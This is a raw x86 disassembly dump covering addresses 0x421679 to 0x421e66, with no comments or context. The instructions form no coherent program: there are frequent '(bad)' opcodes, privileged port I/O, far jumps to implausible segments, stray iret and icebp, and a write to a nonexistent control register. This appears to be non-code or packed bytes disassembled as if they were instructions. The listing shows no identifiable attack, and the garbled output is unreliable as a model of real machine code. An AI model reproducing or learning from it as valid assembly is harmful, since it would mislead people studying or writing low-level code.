  421679:	rcl    DWORD PTR [ecx+0x5d38d4fd],cl
  42167f:	lods   al,BYTE PTR ds:[esi]
  421680:	sar    DWORD PTR [esi-0x1a],1
  421683:	xchg   edi,eax
  421684:	add    al,0x63
  421686:	imul   edx,DWORD PTR [edi-0x430e5593],0xffffffcc
  42168d:	xchg   ebp,eax
  42168e:	imul   esp,esi,0xffffffc4
  421691:	cwde   
  421692:	sbb    al,0xe0
  421694:	sahf   
  421695:	lea    ecx,[edi+0x7]
  421698:	pushf  
  421699:	shr    DWORD PTR [edi+0x33],0xbd
  42169d:	test   esi,esi
  42169f:	push   ecx
  4216a0:	jbe    0x4216ed
  4216a2:	push   eax
  4216a3:	push   cs
  4216a4:	jae    0x4216e4
  4216a6:	lods   al,BYTE PTR ds:[esi]
  4216a7:	fidiv  DWORD PTR [edi-0x4d084d33]
  4216ad:	cmp    eax,0xc0e444e2
  4216b2:	mov    ah,0x55
  4216b4:	jno    0x4216ea
  4216b6:	iret   
  4216b7:	adc    BYTE PTR [ecx+eax*2+0x5dd53a5e],0xb1
  4216bf:	sahf   
  4216c0:	sahf   
  4216c1:	or     dl,BYTE PTR [ebx]
  4216c3:	js     0x4216ba
  4216c5:	(bad)  
  4216c6:	out    dx,eax
  4216c7:	xchg   ecx,eax
  4216c8:	sbb    al,0xa8
  4216ca:	add    esi,DWORD PTR [edi-0x2d]
  4216cd:	shr    al,0x14
  4216d0:	mov    DWORD PTR [edi],0x3cd9a8b4
  4216d6:	add    eax,0x5436c0ba
  4216db:	les    eax,FWORD PTR [eax+0x363ab5c5]
  4216e1:	cmp    eax,DWORD PTR [eax+0xabc044d]
  4216e7:	fidiv  DWORD PTR [ebp-0x20]
  4216ea:	mov    esp,0xa5e26c34
  4216ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216f0:	outs   dx,DWORD PTR ds:[esi]
  4216f1:	or     DWORD PTR [ebx],ebx
  4216f3:	out    dx,eax
  4216f4:	push   es
  4216f5:	push   edi
  4216f6:	cmp    DWORD PTR [edi],esp
  4216f8:	fsub   DWORD PTR [edx]
  4216fa:	mov    dh,0xab
  4216fc:	jns    0x421741
  4216fe:	cs jne 0x421772
  421701:	mov    eax,ds:0x7245c4b8
  421706:	ret    
  421707:	out    0xed,eax
  421709:	stos   BYTE PTR es:[edi],al
  42170a:	push   ss
  42170b:	jecxz  0x421707
  42170d:	push   edi
  42170e:	in     al,0x7b
  421710:	adc    eax,0x8d0d3758
  421715:	or     al,0x74
  421717:	mov    ebx,0x7da248ce
  42171c:	dec    ebp
  42171d:	lods   al,BYTE PTR fs:[esi]
  42171f:	ins    BYTE PTR es:[edi],dx
  421720:	or     dl,al
  421722:	push   esi
  421723:	mov    esp,0x4d7578b0
  421728:	mov    eax,0x6357fdf6
  42172d:	scas   eax,DWORD PTR es:[edi]
  42172e:	mov    esp,0xfdc5c62f
  421733:	rcr    BYTE PTR [ebx+0x156dae39],0xd8
  42173a:	mov    al,ds:0x72334356
  42173f:	pop    ds
  421740:	or     al,0x58
  421742:	adc    DWORD PTR [eax-0x5c],eax
  421745:	or     eax,0xcccb9fcd
  42174a:	int    0xee
  42174c:	push   eax
  42174d:	add    eax,0x4eb54c2d
  421752:	xor    eax,0xeb9b76d1
  421757:	je     0x42171d
  421759:	mov    edx,0x5c631b87
  42175e:	in     al,dx
  42175f:	(bad)  
  421760:	dec    edx
  421761:	dec    ecx
  421762:	std    
  421763:	sti    
  421764:	cmp    eax,0x333c718
  421769:	mov    esi,0xcf58a98
  42176e:	mov    dl,0x27
  421770:	retf   
  421771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421772:	shl    DWORD PTR [ecx+0x1ed208be],1
  421778:	faddp  st(3),st
  42177a:	nop
  42177b:	push   edi
  42177c:	xor    al,0xde
  42177f:	sbb    DWORD PTR [ebp-0x78fed991],edi
  421785:	or     BYTE PTR [ebx-0x1dfba0fc],0xb5
  42178c:	jbe    0x421763
  42178e:	cmp    cl,BYTE PTR [edx-0x71]
  421791:	rol    BYTE PTR [edi+0x17],cl
  421794:	arpl   WORD PTR [edi+0x47],bp
  421797:	adc    al,0xfe
  421799:	out    0xbc,eax
  42179b:	mov    bl,0x7f
  42179d:	pop    ebp
  42179e:	fdiv   DWORD PTR [ebp-0x6e]
  4217a1:	mov    cl,0x10
  4217a3:	sub    bh,bh
  4217a5:	add    edi,DWORD PTR [ebx]
  4217a7:	push   0xf1b7948
  4217ac:	loopne 0x421782
  4217ae:	aaa    
  4217af:	scas   al,BYTE PTR es:[edi]
  4217b0:	push   0x21e1e52c
  4217b5:	inc    ecx
  4217b6:	out    dx,al
  4217b7:	pop    esp
  4217b8:	fst    QWORD PTR [ebx]
  4217ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217bb:	sub    bl,BYTE PTR [eax]
  4217bd:	jle    0x42179a
  4217bf:	rcr    BYTE PTR [ecx],cl
  4217c1:	dec    esp
  4217c2:	lods   al,BYTE PTR ds:[esi]
  4217c3:	fwait
  4217c4:	iret   
  4217c5:	pop    ebp
  4217c6:	call   0x75544270
  4217cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217cc:	ret    
  4217cd:	xchg   esi,eax
  4217ce:	adc    eax,0xe7646008
  4217d3:	xchg   esp,eax
  4217d4:	and    DWORD PTR [edi],edi
  4217d6:	popa   
  4217d7:	xchg   esp,eax
  4217d8:	and    BYTE PTR [esi+0x78a64029],ch
  4217de:	cmp    bl,BYTE PTR [esi+0x72]
  4217e1:	add    esp,DWORD PTR [ecx-0x56]
  4217e4:	push   ebx
  4217e5:	ins    DWORD PTR es:[edi],dx
  4217e6:	cli    
  4217e7:	mov    eax,edi
  4217e9:	pop    edi
  4217ea:	push   edx
  4217eb:	mov    ds:0x92d45ac3,al
  4217f0:	push   ebp
  4217f1:	dec    eax
  4217f2:	inc    edx
  4217f3:	sbb    bh,BYTE PTR fs:[ebp+0x69]
  4217f7:	(bad)  
  4217f8:	mov    dl,0x93
  4217fa:	gs or  al,0x71
  4217fd:	test   ebp,0x9e6c1094
  421803:	xchg   DWORD PTR [edi],ebx
  421805:	or     dl,BYTE PTR [esi+0x44]
  421808:	inc    edi
  421809:	xchg   ebp,eax
  42180a:	xchg   edx,eax
  42180b:	scas   eax,DWORD PTR es:[edi]
  42180c:	inc    ecx
  42180d:	in     eax,0xbe
  42180f:	push   0xea1a7239
  421814:	fcmove st,st(5)
  421816:	adc    ah,BYTE PTR [edi-0x50]
  421819:	jg     0x421859
  42181b:	sub    dh,BYTE PTR [edi+0x4c54e64a]
  421821:	push   0x185aed87
  421826:	call   0x80a7:0xfee6f660
  42182d:	in     eax,dx
  42182e:	cli    
  42182f:	ds popa 
  421831:	mov    bl,0x80
  421833:	data16 std 
  421835:	fdiv   st(4),st
  421837:	rcr    DWORD PTR ds:0xdd17c2cd,0x22
  42183e:	jle    0x421803
  421840:	stos   BYTE PTR es:[edi],al
  421841:	scas   al,BYTE PTR es:[edi]
  421842:	xor    BYTE PTR [ebp-0x7d],cl
  421845:	xchg   esi,eax
  421846:	xchg   ch,cl
  421848:	rol    edi,0xfe
  42184b:	mov    edx,0xbec6f006
  421850:	xchg   edi,eax
  421851:	xchg   ebx,eax
  421852:	lea    ecx,[edx-0x3868591d]
  421858:	or     DWORD PTR [edx+0x4],ecx
  42185b:	adc    bl,bl
  42185d:	test   al,0x38
  42185f:	add    ch,bl
  421861:	xchg   ebx,eax
  421862:	or     esp,ecx
  421864:	and    eax,0x8dcb7483
  421869:	pop    ebx
  42186a:	cld    
  42186b:	retf   0xe14
  42186e:	mov    esi,ds
  421870:	push   eax
  421871:	loop   0x4218ad
  421873:	cli    
  421874:	adc    al,0xb2
  421876:	sub    dh,BYTE PTR [edi-0x46fb1fff]
  42187c:	xor    al,BYTE PTR [edx+0x45734882]
  421882:	adc    al,0x58
  421884:	or     BYTE PTR [ebp+0x18a7687],al
  42188a:	push   0x48
  42188c:	push   ebp
  42188d:	sbb    esi,esi
  42188f:	jne    0x42186a
  421891:	cmp    BYTE PTR [edi-0x5a],0xde
  421895:	adc    BYTE PTR [esi-0x1e],ch
  421898:	ins    DWORD PTR es:[edi],dx
  421899:	adc    DWORD PTR [esi-0x4f6179b7],edi
  42189f:	scas   al,BYTE PTR es:[edi]
  4218a0:	cli    
  4218a1:	not    ebp
  4218a3:	dec    DWORD PTR [edi]
  4218a5:	mov    ah,0x8b
  4218a7:	jge    0x421857
  4218a9:	div    DWORD PTR [esi+eiz*1+0x587bd07c]
  4218b0:	pop    edi
  4218b1:	and    esp,DWORD PTR [edi+0x37232b94]
  4218b7:	add    ch,BYTE PTR [edx]
  4218b9:	inc    esi
  4218ba:	repz xchg ebp,eax
  4218bc:	xor    al,0x86
  4218be:	xchg   esp,eax
  4218bf:	mov    ecx,0xabb4595b
  4218c4:	or     eax,0x96f0f6d1
  4218c9:	dec    eax
  4218ca:	pop    ecx
  4218cb:	test   esp,ebp
  4218cd:	test   eax,0x68435bbf
  4218d2:	mov    ch,0xf1
  4218d4:	jmp    0x5ede8fbd
  4218d9:	clc    
  4218da:	cmp    dh,cl
  4218dc:	lahf   
  4218dd:	mov    dh,0xc2
  4218df:	sbb    eax,0x746ed7a0
  4218e4:	push   edx
  4218e5:	dec    ebx
  4218e6:	cmp    eax,0x9c46bf14
  4218eb:	shr    BYTE PTR [esi],cl
  4218ed:	fld    TBYTE PTR ds:0x7ac6f2a9
  4218f3:	ja     0x42187c
  4218f5:	stos   DWORD PTR es:[edi],eax
  4218f6:	fisttp WORD PTR [ebx-0x64]
  4218f9:	ja     0x421898
  4218fb:	push   edx
  4218fc:	jmp    0x8a9b:0x34bdde97
  421903:	ret    
  421904:	xchg   esi,eax
  421905:	push   es
  421906:	push   esi
  421907:	pop    es
  421908:	jmp    0xf6459bb8
  42190d:	mov    al,0xdd
  42190f:	in     al,dx
  421910:	repz gs mov dl,0x4b
  421914:	sbb    BYTE PTR [eax-0x30],ch
  421917:	mov    ebp,0xb76818bb
  42191c:	sti    
  42191d:	repnz lock inc esp
  421920:	cdq    
  421921:	jnp    0x421930
  421923:	in     eax,0x48
  421925:	adc    eax,0xd92b714
  42192a:	sbb    BYTE PTR [edx-0x37],dl
  42192d:	push   edx
  42192e:	adc    DWORD PTR [edx-0x1e],edi
  421931:	lea    ebx,[eax]
  421933:	out    dx,al
  421934:	lods   al,BYTE PTR ds:[esi]
  421935:	cmp    DWORD PTR [ebx-0x5b79fdb4],ebx
  42193b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42193c:	mov    ecx,0x335cb61f
  421941:	cwde   
  421942:	sbb    eax,0x56999140
  421947:	jno    0x421922
  421949:	mov    esi,0xc6534021
  42194e:	leave  
  42194f:	lods   eax,DWORD PTR ds:[esi]
  421950:	and    ch,ch
  421952:	xchg   edx,eax
  421953:	jg     0xadcf70aa
  421959:	pop    es
  42195a:	dec    ecx
  42195b:	sub    al,0x46
  42195d:	xor    al,al
  42195f:	add    al,0x7d
  421961:	cs ins BYTE PTR es:[edi],dx
  421963:	pop    eax
  421964:	xor    eax,0x7ffc52a0
  421969:	and    al,0x70
  42196b:	stos   BYTE PTR es:[edi],al
  42196c:	push   ds
  42196d:	inc    ebx
  42196e:	cmc    
  42196f:	push   cs
  421970:	jmp    0x2a9f59ad
  421975:	cmp    edx,esp
  421977:	lahf   
  421978:	daa    
  421979:	int3   
  42197a:	sbb    BYTE PTR [esi+0x39],0xd5
  42197e:	sub    BYTE PTR [esi],0x55
  421981:	mov    esp,0xd163e12b
  421986:	push   DWORD PTR [edx+0x56]
  421989:	dec    esi
  42198a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42198b:	fist   WORD PTR [esi]
  42198d:	repz push 0x27
  421990:	jl     0x42193a
  421992:	fs leave 
  421994:	mov    bh,0x55
  421996:	pop    esi
  421997:	int3   
  421998:	dec    ebx
  421999:	push   0xc65354f4
  42199e:	mov    ds:0x3b9ad4d8,eax
  4219a3:	sbb    esi,DWORD PTR [eax+0x6766c947]
  4219a9:	test   eax,0x91291b82
  4219ae:	cli    
  4219af:	cmp    al,0x67
  4219b1:	stos   BYTE PTR es:[edi],al
  4219b2:	inc    esp
  4219b3:	pop    edx
  4219b4:	mov    dl,0x5f
  4219b6:	xchg   esp,eax
  4219b7:	mov    eax,ds:0xdb80ec7a
  4219bc:	repz mov esp,edi
  4219bf:	fsub   QWORD PTR [ecx+esi*8]
  4219c2:	mov    eax,ds:0xe22f2375
  4219c7:	fld    QWORD PTR ds:0x3c1bd472
  4219cd:	xchg   ecx,eax
  4219ce:	(bad)  
  4219cf:	stc    
  4219d0:	ss jns 0x421a0e
  4219d3:	lahf   
  4219d4:	ss pop edi
  4219d6:	and    esi,DWORD PTR [eax]
  4219d8:	add    eax,0x3ef923b1
  4219dd:	mov    eax,ds:0x2600faa3
  4219e2:	jbe    0x4219dc
  4219e4:	adc    cl,dh
  4219e6:	test   eax,0xa0da882e
  4219eb:	aas    
  4219ec:	add    DWORD PTR [ecx],esp
  4219ee:	cmp    al,0x45
  4219f0:	sbb    eax,0x3f5d02b
  4219f5:	jg     0x4219a4
  4219f7:	push   ss
  4219f8:	imul   esi,DWORD PTR [esi],0x82cff279
  4219fe:	and    al,0x78
  421a00:	jmp    0x4219dd
  421a02:	add    DWORD PTR [esi],eax
  421a04:	out    0xa,eax
  421a06:	popa   
  421a07:	shr    DWORD PTR [eax+edx*2-0x7cb5e1d3],cl
  421a0e:	out    0x2e,al
  421a10:	outs   dx,DWORD PTR ds:[esi]
  421a11:	push   ds
  421a12:	repz cmp DWORD PTR [ecx],ecx
  421a15:	push   ebx
  421a16:	das    
  421a17:	push   0xbd3e84af
  421a1c:	xor    DWORD PTR [ecx],esi
  421a1e:	mov    DWORD PTR [eax],eax
  421a20:	jbe    0x421a17
  421a22:	sbb    eax,0x78683e02
  421a27:	dec    edi
  421a28:	mov    edi,0x41137a08
  421a2d:	jp     0x4219c1
  421a2f:	ret    
  421a30:	inc    esp
  421a31:	mov    esp,DWORD PTR [eax+esi*8-0x21727412]
  421a38:	test   eax,0xa326f674
  421a3d:	mov    ebp,0x9d355586
  421a42:	add    BYTE PTR [eax+0x3b],bh
  421a45:	sub    eax,0x193fc19
  421a4a:	outs   dx,BYTE PTR ds:[esi]
  421a4b:	add    eax,0x4dde4ec3
  421a50:	or     al,0x76
  421a52:	retf   
  421a53:	aaa    
  421a54:	test   eax,0x4284553e
  421a59:	jmp    0xaffc:0x196b26fd
  421a60:	mov    BYTE PTR [ebx-0x653354a0],ch
  421a66:	jno    0x421ab8
  421a68:	inc    esi
  421a69:	xor    eax,0x15a2c552
  421a6e:	jo     0x421acf
  421a70:	push   edi
  421a71:	cmp    BYTE PTR [edx+0x11],0x44
  421a75:	scas   al,BYTE PTR es:[edi]
  421a76:	lea    esp,[esi]
  421a78:	mov    eax,0xc64c6f4b
  421a7d:	(bad)  
  421a7e:	cld    
  421a7f:	pop    ds
  421a80:	adc    cl,BYTE PTR [esi+0x2d55e98a]
  421a86:	mov    ds:0x106e188e,al
  421a8b:	enter  0x3d14,0x15
  421a8f:	sar    BYTE PTR [ecx-0x46],0x92
  421a93:	push   edi
  421a94:	inc    ebx
  421a95:	cmp    dl,BYTE PTR [edx+0x74]
  421a98:	idiv   ch
  421a9a:	inc    edx
  421a9b:	and    dl,BYTE PTR [ebp-0x17cc9de4]
  421aa1:	sub    ah,BYTE PTR ds:0xa4666490
  421aa7:	das    
  421aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421aa9:	add    dh,BYTE PTR [eax+0x41]
  421aac:	dec    edx
  421aad:	call   0xa9ecf328
  421ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ab3:	das    
  421ab4:	add    esi,ebp
  421ab6:	jg     0x421a7b
  421ab8:	addr16 xor eax,0x9b4512d9
  421abe:	lods   al,BYTE PTR ds:[esi]
  421abf:	pop    ebp
  421ac0:	mov    bh,0xde
  421ac2:	cli    
  421ac3:	sbb    eax,0x47d23cb6
  421ac8:	addr16 addr16 push eax
  421acb:	push   ecx
  421acc:	push   0xb889f3ef
  421ad1:	stos   DWORD PTR es:[edi],eax
  421ad2:	add    eax,0x4ec8e515
  421ad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ad8:	rcr    BYTE PTR [esi],cl
  421ada:	inc    esi
  421adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421adc:	sub    al,0xae
  421ade:	cmp    BYTE PTR [ecx-0x6e],0x2e
  421ae2:	jecxz  0x421b60
  421ae4:	sbb    bl,BYTE PTR [ebx-0x26]
  421ae7:	cmp    DWORD PTR [esi],ecx
  421ae9:	je     0x421ad6
  421aeb:	gs leave 
  421aed:	(bad)  
  421aef:	jae    0x421b0f
  421af1:	cs cwde 
  421af3:	xor    ebp,ebx
  421af5:	add    DWORD PTR [esi],0xffffffcc
  421af8:	mov    ebp,0xdaf40d5e
  421afd:	xchg   al,ch
  421aff:	das    
  421b00:	adc    al,0x7f
  421b02:	or     al,0xa4
  421b04:	jns    0x421b7c
  421b06:	adc    BYTE PTR [edi+eiz*2+0x7bfc36d4],ch
  421b0d:	xor    al,0x3d
  421b0f:	retf   0x19fc
  421b12:	(bad)  
  421b13:	in     al,0x91
  421b15:	pop    es
  421b16:	inc    esp
  421b17:	mov    bl,0x56
  421b19:	out    dx,eax
  421b1a:	mov    cl,0xbf
  421b1c:	mov    dh,0xab
  421b1e:	inc    esi
  421b1f:	mov    ds:0xa3b4623a,al
  421b24:	popa   
  421b25:	(bad)  
  421b26:	hlt    
  421b27:	aam    0x2c
  421b29:	stos   BYTE PTR es:[edi],al
  421b2a:	rcl    esp,cl
  421b2c:	inc    ebp
  421b2d:	mov    ah,0x10
  421b2f:	cmp    eax,0x7e2fc6e8
  421b34:	and    eax,0x5923d966
  421b39:	out    dx,eax
  421b3a:	or     bl,al
  421b3c:	test   eax,0x15fac907
  421b41:	lds    ebx,FWORD PTR [ebx+0x21]
  421b44:	sbb    ecx,DWORD PTR [edx]
  421b46:	and    eax,0xf14728fa
  421b4b:	scas   eax,DWORD PTR es:[edi]
  421b4c:	add    BYTE PTR [ebp+edi*4-0x5d78e2bd],bh
  421b53:	dec    eax
  421b54:	adc    ch,BYTE PTR [ecx+ebp*4+0x57d19762]
  421b5b:	outs   dx,DWORD PTR ds:[esi]
  421b5c:	int3   
  421b5d:	push   ebx
  421b5e:	cmp    cl,BYTE PTR [edi+0x1578832d]
  421b64:	mov    edx,DWORD PTR [esi-0x59]
  421b67:	jno    0x421b0a
  421b69:	adc    BYTE PTR [ebx-0x73e5e15d],bl
  421b6f:	aas    
  421b70:	(bad)  
  421b72:	enter  0x47be,0x2b
  421b76:	xor    BYTE PTR ss:[edi+ebx*4+0x40],dh
  421b7b:	add    DWORD PTR [edx+0x1a1a08cd],edx
  421b81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b82:	icebp  
  421b83:	cld    
  421b84:	dec    esi
  421b85:	adc    bl,BYTE PTR gs:[ecx+0x61681081]
  421b8c:	jns    0x421b17
  421b8e:	push   ds
  421b8f:	js     0x421ba3
  421b91:	mov    dl,0x59
  421b93:	test   BYTE PTR ds:0xf5b50c93,bl
  421b99:	mov    esi,0x220071cc
  421b9e:	jae    0x421b90
  421ba0:	(bad)  
  421ba1:	mov    cr5,eax
  421ba4:	test   DWORD PTR [ebx],edi
  421ba6:	sbb    al,0x15
  421ba8:	xlat   BYTE PTR ds:[ebx]
  421ba9:	sbb    BYTE PTR [edi+0x16],0xc1
  421bad:	fstp   TBYTE PTR [edx+0x49e0c644]
  421bb3:	hlt    
  421bb4:	mov    edx,0x464b7f1d
  421bb9:	push   eax
  421bba:	pop    esp
  421bbb:	jno    0x421bcd
  421bbd:	jns    0x421bec
  421bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bc0:	mov    eax,0x493ef6ac
  421bc5:	gs push eax
  421bc7:	dec    ecx
  421bc8:	daa    
  421bc9:	mov    bl,0xae
  421bcb:	popf   
  421bcc:	mov    al,ds:0x47ec4efc
  421bd1:	inc    ecx
  421bd2:	jg     0x421c18
  421bd4:	adc    al,0xc1
  421bd6:	(bad)  
  421bd7:	or     eax,0x86fda2ab
  421bdc:	cmp    bl,cl
  421bde:	(bad)  
  421bdf:	pop    edi
  421be0:	sub    BYTE PTR [edx-0x78],ah
  421be3:	lods   eax,DWORD PTR ds:[esi]
  421be4:	pop    ebp
  421be5:	inc    esp
  421be6:	push   es
  421be7:	dec    ebx
  421be8:	lahf   
  421be9:	(bad)  [esi-0x44]
  421bec:	or     ch,BYTE PTR [esi-0x1a7fae81]
  421bf2:	fcomp  QWORD PTR [ebx-0x62]
  421bf5:	add    eax,0xa97cb40
  421bfa:	push   ebx
  421bfb:	enter  0x85e,0x41
  421bff:	or     DWORD PTR [edx-0x64185077],ebp
  421c05:	cmp    dh,BYTE PTR ds:[eax+0x43560000]
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx-0x65eb168e]
  421c18:	mov    BYTE PTR [edx+edi*8-0x79fffe56],dh
  421c1f:	push   es
  421c20:	add    BYTE PTR [eax],al
  421c22:	sub    BYTE PTR [ecx],0x27
  421c25:	gs mov dh,0xcb
  421c28:	inc    edx
  421c29:	jg     0x421c3c
  421c2b:	add    BYTE PTR [eax],0xb6
  421c2e:	and    eax,0x275cf27c
  421c33:	mov    bl,cl
  421c35:	imul   ecx,DWORD PTR ds:0x1116d356,0x14
  421c3c:	mov    bl,al
  421c3e:	adc    DWORD PTR [edx],edx
  421c40:	push   edx
  421c41:	adc    ch,BYTE PTR [edx-0x501efbed]
  421c47:	cs fsubr st(6),st
  421c4a:	or     DWORD PTR ss:[eax+0x29548f6f],0x67
  421c52:	test   ah,dh
  421c54:	cmp    eax,0xd310aa84
  421c59:	daa    
  421c5a:	rcl    BYTE PTR [edx-0x1680890d],cl
  421c60:	add    al,ch
  421c62:	and    al,0xdd
  421c64:	iret   
  421c65:	pusha  
  421c66:	mov    dl,0x61
  421c68:	mov    DWORD PTR [edi-0x51],0x6d623f1b
  421c6f:	cld    
  421c70:	pop    esp
  421c71:	(bad)  
  421c72:	jge    0x421c7b
  421c74:	sub    DWORD PTR [eax-0x7c],0xfef37459
  421c7b:	out    0x8a,eax
  421c7d:	loopne 0x421c94
  421c7f:	push   edx
  421c80:	into   
  421c81:	in     al,0x41
  421c83:	push   ebx
  421c84:	push   ebp
  421c85:	iret   
  421c86:	sti    
  421c87:	xlat   BYTE PTR ds:[ebx]
  421c88:	fisub  WORD PTR [ebx-0x26c5d0d7]
  421c8e:	adc    eax,0xe7e7208f
  421c93:	ror    DWORD PTR [ebx-0x14],0x9
  421c97:	xchg   ecx,eax
  421c98:	rcr    DWORD PTR [edi],1
  421c9a:	(bad)
  421c9d:	mov    dh,0xd4
  421c9f:	aas    
  421ca0:	pop    esi
  421ca1:	sub    eax,0x9b01b1eb
  421ca6:	stos   DWORD PTR es:[edi],eax
  421ca7:	aas    
  421ca8:	xor    edi,DWORD PTR [edi-0x22]
  421cab:	xor    al,0xe0
  421cad:	and    eax,0x130cc337
  421cb2:	sbb    al,0xaa
  421cb4:	in     eax,0x47
  421cb6:	in     al,0x2d
  421cb8:	dec    ebp
  421cb9:	popf   
  421cba:	xchg   esi,eax
  421cbb:	rcl    DWORD PTR [eax+0x2e],cl
  421cbe:	popf   
  421cbf:	push   edi
  421cc0:	adc    DWORD PTR [ecx-0x6870e338],esp
  421cc6:	mov    fs,WORD PTR [esi]
  421cc8:	sbb    al,0x5c
  421cca:	and    al,0x39
  421ccc:	push   esi
  421ccd:	fidivr WORD PTR [eax]
  421ccf:	add    al,0x69
  421cd1:	sbb    DWORD PTR [eax+0x4a829ded],ecx
  421cd7:	and    WORD PTR [edi*4-0x341356a1],sp
  421cdf:	imul   edx,DWORD PTR [esi-0x50],0x34bf4839
  421ce6:	scas   eax,DWORD PTR es:[edi]
  421ce7:	push   esi
  421ce8:	sbb    dh,BYTE PTR [ecx+0x13d36d10]
  421cee:	test   BYTE PTR [ebp+ebp*2-0x72],dl
  421cf2:	push   ebx
  421cf3:	cwde   
  421cf4:	adc    al,0x1e
  421cf6:	pop    ss
  421cf7:	into   
  421cf8:	push   cs
  421cf9:	jmp    0x421d0a
  421cfb:	call   0x16744fc5
  421d00:	popa   
  421d01:	mov    al,ds:0x7a32b7cc
  421d06:	jg     0x421d86
  421d08:	cmp    edi,esp
  421d0a:	iret   
  421d0b:	rcl    BYTE PTR [ebx],0x87
  421d0e:	(bad)  
  421d0f:	int    0x67
  421d11:	cmp    al,0x89
  421d13:	in     eax,dx
  421d14:	sbb    ch,bl
  421d16:	or     DWORD PTR [edx-0x2a639262],ebp
  421d1c:	or     esp,0xffffffc3
  421d1f:	stc    
  421d20:	or     DWORD PTR [esi-0x75ae8ca2],ebp
  421d26:	call   0x4dc4:0x59d2295a
  421d2d:	mov    eax,0xe2aff217
  421d32:	push   cs
  421d33:	mov    bh,0x54
  421d35:	lods   al,BYTE PTR ds:[esi]
  421d36:	lods   eax,DWORD PTR ds:[esi]
  421d37:	mov    WORD PTR [ebx+0x2e],es
  421d3a:	adc    BYTE PTR [edi-0x18],dl
  421d3d:	imul   esp,DWORD PTR [ebx],0x41
  421d40:	gs xchg esp,eax
  421d42:	cdq    
  421d43:	and    ch,bl
  421d45:	jbe    0x421d3a
  421d47:	push   eax
  421d48:	push   es
  421d49:	push   es
  421d4a:	in     eax,dx
  421d4b:	icebp  
  421d4c:	dec    esp
  421d4d:	push   ebx
  421d4e:	push   edx
  421d4f:	jno    0x421cfd
  421d51:	mov    dl,0xa8
  421d53:	iret   
  421d54:	add    al,BYTE PTR [ecx]
  421d56:	sub    al,0xa1
  421d58:	cwde   
  421d59:	ret    0xdbde
  421d5c:	fcom   DWORD PTR cs:[ecx+0x6d9c8aec]
  421d63:	mov    dh,dl
  421d65:	and    esi,DWORD PTR [esi+ebp*4]
  421d68:	cwde   
  421d69:	(bad)  
  421d6a:	sbb    dl,dh
  421d6c:	cmp    DWORD PTR [esi+0x64],esp
  421d6f:	mov    ds:0x34e19f28,al
  421d74:	call   0x69101d7f
  421d79:	mov    ecx,0x1435f10c
  421d7e:	xchg   ebp,eax
  421d7f:	push   edi
  421d80:	sbb    ebx,0x30d8e608
  421d86:	gs jmp 0xd016:0x3b128c2
  421d8e:	or     BYTE PTR [esi-0x47],ah
  421d91:	xor    esi,DWORD PTR [ebp-0x59]
  421d94:	jmp    0xcdb1:0x3dcd84ff
  421d9b:	fldenv [eax+ebx*2-0x14]
  421d9f:	stos   BYTE PTR es:[edi],al
  421da0:	xor    al,0xc6
  421da2:	push   ss
  421da3:	mov    dh,0x26
  421da5:	(bad)  
  421da6:	cdq    
  421da7:	jb     0x421daf
  421da9:	nop
  421daa:	lods   al,BYTE PTR ds:[esi]
  421dab:	pcmpgtd mm4,QWORD PTR [ebp+0x1eb05e29]
  421db2:	xchg   esi,eax
  421db3:	mov    cl,BYTE PTR [eax+0x3d00c37b]
  421db9:	dec    ebx
  421dba:	cmp    al,0xa2
  421dbc:	pop    ecx
  421dbd:	sbb    eax,0x836f3b50
  421dc2:	adc    esi,DWORD PTR [eax+0xb303fcf]
  421dc8:	fild   DWORD PTR ds:0x58d1182d
  421dce:	add    WORD PTR [ebx],dx
  421dd1:	pop    edx
  421dd2:	xchg   esp,eax
  421dd3:	pop    ebp
  421dd4:	or     DWORD PTR [edi+edx*8],edi
  421dd7:	sbb    BYTE PTR ds:0xa90dd8cd,bl
  421ddd:	sub    ah,BYTE PTR [edx-0x2b]
  421de0:	cmp    al,0x3c
  421de2:	cmp    eax,0xf492547b
  421de7:	adc    BYTE PTR [eax],0xdd
  421dea:	mov    edx,0x51c9b124
  421def:	mov    dh,0xe0
  421df1:	adc    ebp,ebp
  421df3:	inc    esp
  421df4:	jle    0x421d86
  421df6:	jno    0x421e32
  421df8:	push   edx
  421df9:	mov    al,ds:0xd1cf8e16
  421dfe:	inc    BYTE PTR [edi]
  421e00:	jp     0x421dc7
  421e02:	jnp    0x421e60
  421e04:	icebp  
  421e05:	call   0xc1520127
  421e0a:	cmp    eax,0x1f9347b8
  421e0f:	icebp  
  421e10:	icebp  
  421e11:	mov    edx,edi
  421e13:	cmp    edi,DWORD PTR ds:0xc7d449f9
  421e19:	addr16 mov eax,ds:0x4eed
  421e1d:	jae    0x421e8f
  421e1f:	sbb    BYTE PTR [ebx],cl
  421e21:	push   ss
  421e22:	cmp    BYTE PTR [ecx-0x55b39df3],ah
  421e28:	test   BYTE PTR [ebp+0x2bda7913],bl
  421e2e:	idiv   DWORD PTR [ebx-0x29]
  421e31:	rol    bl,cl
  421e33:	pop    ebx
  421e34:	test   DWORD PTR [esi+ebx*2+0x40],0xc0d7d5cb
  421e3c:	xor    DWORD PTR [ebp-0x52d3afb4],edx
  421e42:	sub    edx,DWORD PTR [ebp-0xd55eed6]
  421e48:	imul   ebp,DWORD PTR [edi],0xffffffd7
  421e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e4c:	sub    esi,ebx
  421e4e:	add    BYTE PTR [edx+0x1c],ch
  421e51:	enter  0xdd32,0xc1
  421e55:	mov    ecx,0xd73ffd1c
  421e5a:	mov    bl,BYTE PTR [eax+edi*8+0x3e]
  421e5e:	push   ebx
  421e5f:	xor    eax,0xe345ad13
  421e64:	inc    esp
  421e65:	pop    ds
  421e66:	inc    ecx
